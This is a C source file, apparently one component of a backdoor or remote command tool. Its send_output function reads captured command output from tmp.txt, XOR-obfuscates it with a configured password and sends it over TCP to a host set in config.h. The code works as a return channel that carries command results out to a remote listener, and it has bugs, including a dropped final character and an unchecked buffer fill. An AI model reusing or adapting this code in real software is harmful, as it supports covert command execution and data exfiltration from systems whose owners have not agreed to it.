#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include "config.h"

#define BUFFER_SIZE 65535

void send_output()
{
    FILE *fp;
    int sockfd, portno, n;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    char buffer[BUFFER_SIZE];

    portno = atoi(CLIENT_PORT);

    /* Create a socket point */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0)
    {
        perror("ERROR opening socket");
        exit(1);
    }

    server = gethostbyname(CLIENT_IP);

    if (server == NULL)
    {
        fprintf(stderr, "ERROR, no such host\n");
        exit(0);
    }

    bzero((char *)&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr_list[0], (char *)&serv_addr.sin_addr.s_addr, server->h_length);
    serv_addr.sin_port = htons(portno);

    /* Now connect to the server */
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        perror("ERROR connecting");
        exit(1);
    }

    fp = fopen("tmp.txt", "r+");
    if (fp == NULL)
    {
        printf("Error opening file\n");
        exit(1);
    }
    /* check if the command is validated*/
    int c = fgetc(fp);
    if(c ==EOF){
        fprintf(fp,"%s","command not found\n");
        rewind(fp);
    } else {
        ungetc(c,fp);
    }
    /*get the result of the command*/
    int i = 0;
    do
    {
        buffer[i] = (char)fgetc(fp);
    } while (buffer[i++] != EOF);
    buffer[i - 1] = '\0';

    /*Encryption XOR*/
    char encrypt[BUFFER_SIZE] = "";
    char* ptr;
    ptr = buffer;
    int len = strlen(buffer);
    int loop;
    for(loop = 0; loop < (len - 1); loop++) {
        encrypt[loop] = ptr[loop] ^ PASSWORD[(loop % PASSLEN)];
    }
    encrypt[loop] = '\0';
    /* Send message to the server */
    n = write(sockfd, encrypt, strlen(buffer));
    if (n < 0)
    {
        perror("ERROR writing to socket");
        exit(1);
    }
}